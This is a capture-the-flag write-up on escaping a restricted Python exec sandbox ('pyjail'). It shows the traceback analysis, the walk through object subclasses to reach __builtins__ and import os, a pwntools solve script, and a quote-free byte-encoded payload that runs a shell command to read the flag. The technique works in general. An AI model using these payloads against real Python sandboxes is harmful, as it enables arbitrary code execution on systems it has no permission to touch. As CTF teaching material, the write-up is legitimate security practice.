# Build yourself in

Challenge text:
```
The extraterrestrials have upgraded their authentication system and now only them are able to pass. Did you manage to learn their language well enough in order to bypass the the authorization check?
```

I connected to the challenge using netcat, and it appeared to be a Python prompt. As a test I sent `a`
```bash
$ nc 188.166.156.174 30022
3.8.9 (default, Apr 15 2021, 05:07:04) 
[GCC 10.2.1 20201203]

[*] Only 👽 are allowed!

>>> a
Traceback (most recent call last):
  File "/app/build_yourself_in.py", line 16, in <module>
    main()
  File "/app/build_yourself_in.py", line 13, in main
    exec(text, {'__builtins__': None, 'print':print})
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not subscriptable
``` 
In the traceback we see the line that executes our code; `exec(text, {'__builtins__': None, 'print':print})`. This line pretty much means that we don't have access to any of the [builtin functions](https://docs.python.org/3.8/library/functions.html), and the only function we can execute is `print()`. After a bit more experimenting, I also realize that quotes are not allowed, so we somehow have to bypass that as well.

In Python, there's both the builtins method, and `__builtins_`. In the [docs for the builtins methods](https://docs.python.org/3/library/builtins.html) we see the line:
> As an implementation detail, most modules have the name `__builtins__` made available as part of their globals.

This means that we can access `__builtins__` by accessing a module's globals. In pyjails, there are multiple common ways to get ahold of a module's globals. By using internal method calls in Python, we can enumerate and find a module that has globals, in our example; `().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__`.

```py
>>> ().__class__
<class 'tuple'>
>>> ().__class__.__bases__
(<class 'object'>,)
>>> ().__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, ...
>>> ().__class__.__bases__[0].__subclasses__()[94]
<class '_frozen_importlib_external.FileLoader'>
>>> ().__class__.__bases__[0].__subclasses__()[94].__init__
<function FileLoader.__init__ at 0x7faafdf91af0>
>>> ().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__
{'__name__': 'importlib._bootstrap_external', '__doc__': 'Core implemen ...
```

Once we have access to the globals, we can access `__builtins__` module with: `...__globals__["__builtins__"]`. However, a new problem arises, we can't use quotes. To bypass this we can access the `bytes` class with the line `().__class__.__base__.__subclasses__()[6]`. With the bytes class we can craft strings like so; `bytes([95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95]).decode()`, which is the same as `"__builtins__"`

After accessing builtins, we can access `__import__` to import `os`, and then execute shell commands using `os.system()`. I wrote a Python script to craft the full payload.
```py
from pwn import remote

cmd = "cat f*"

def c(string):
    string = ",".join([str(ord(x)) for x in string])

    # __builtins__ -> 95,95,98,117,105,108,116,105,110,115,95,95
    print(string)

    built = f"().__class__.__base__.__subclasses__()[6]([{string}]).decode()" # bytes([list of bytes]).decode()
    return built

payload = f"().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__[{c('__builtins__')}][{c('__import__')}]({c('os')}).system({c(cmd)})"
# ().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat f*")

print(payload)

# connect to the server and send the payload
io = remote("188.166.156.174", 30022)
io.recvuntil(">>> ")
io.sendline(payload)
io.interactive()
```
The final payload is
```py
().__class__.__bases__[0].__subclasses__()[94].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([95,95,98,117,105,108,116,105,110,115,95,95]).decode()][().__class__.__base__.__subclasses__()[6]([95,95,105,109,112,111,114,116,95,95]).decode()](().__class__.__base__.__subclasses__()[6]([111,115]).decode()).system(().__class__.__base__.__subclasses__()[6]([99,97,116,32,102,42]).decode())
```
After running the script, we get the flag:
```
$ py solve.py 
[+] Opening connection to 188.166.156.174 on port 30022: Done
[*] Switching to interactive mode
CHTB{n0_j4il_c4n_h4ndl3_m3!}
```